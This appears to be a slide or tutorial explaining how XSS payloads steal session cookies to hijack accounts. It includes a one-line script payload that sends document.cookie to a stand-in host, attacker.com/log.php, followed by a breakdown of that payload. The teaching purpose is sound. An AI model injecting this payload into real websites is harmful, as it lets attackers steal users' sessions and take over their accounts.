Cookie Theft and Session Hijacking

Stealing User Credentials with Malicious Scripts

How Cookie Theft Works

  • An XSS payload executes in the victim's browser.
  • The script accesses document.cookie to retrieve session cookies.
  • The script sends these cookies to an attacker-controlled server.
  • Attacker uses the stolen cookies to impersonate the victim.

Impact of Session Hijacking

  • Unauthorized Access: Attacker gains full access to the victim's account.
  • Bypasses Authentication: No password needed, only the active session token.
  • Data Exposure: Access to all data the victim can see or modify.
  • Reputation Damage: Can be used to post malicious content or deface profiles.

Cookie Theft Payload Example

<script>window.location='http://attacker.com/log.php?cookie='+document.cookie;</script>

Payload Breakdown

  • <script>...</script>: Defines the malicious JavaScript.
  • document.cookie: Accesses the victim's session cookies.
  • window.location='...': Redirects the browser (or makes a request) to the attacker's server.
  • log.php?cookie=...: Attacker's script to log the stolen cookie.
Key Takeaway

XSS is a primary vector for cookie theft and session hijacking, allowing attackers to impersonate users by stealing their authentication tokens and gaining unauthorized account access.
